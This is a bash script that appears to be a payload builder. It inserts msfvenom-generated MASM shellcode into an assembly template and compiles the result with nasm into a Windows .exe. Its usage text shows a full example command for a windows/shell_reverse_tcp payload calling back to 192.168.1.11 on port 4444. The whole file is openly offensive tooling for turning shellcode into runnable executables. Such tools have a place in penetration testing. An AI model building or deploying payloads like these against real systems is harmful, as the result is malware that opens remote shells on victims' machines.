#!/bin/bash
if [ "$#" -ne 2 ];then
  if [ "$#" -ne 0 ]; then
    echo Invalid invocation
    echo
  fi
  echo "Usage: $0 <MASM_SHELLCODE> <OUTPUT_EXE_FILE>"
  echo 
  echo "MASM_SHELLCODE   : Shellcode in MASM format"
  echo "                   Typically generated with msfvenom with a command of the form"
  echo "                   msfvenom -p windows/<PAYLOAD> <OPTIONS> -f masm -o shellcode.asm"
  echo "OUTPUT_EXE_FILE  : Ouput filename for PE .exe file"
  echo 
  echo "Example:"
  echo "   msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.11 LPORT=4444 -f masm -o shellcode.asm"
  echo "    $0 shellcode.asm shellcode.exe"
  exit
fi


inAsmFile="$1"
outExeFile="$2"
outAsmFile="${outExeFile%.*}.temp.asm"
echo "Integrating shellcode $inAsmFile into $outExeFile."

printf "" > "${outAsmFile}"
cat generic-template.asm | while read -r l; do
  if (echo $l | egrep -q '^[[:space:]]*;;;;SHELLCODE;;;;[[:space:]]*$'); then
    cat "${inAsmFile}" | sed -E -e 's/^\s*buf\s+//' -e 's/([0-9a-fA-F]{2})h/0x\1/g' >> "${outAsmFile}"
  else
    echo "$l" >> "${outAsmFile}"
  fi
done
echo Compiling...
nasm -f bin -o "${outExeFile}" "${outAsmFile}"
echo "PE saved to ${outExeFile}."
echo "Size: $(stat --printf=%s "${outExeFile}") bytes."      
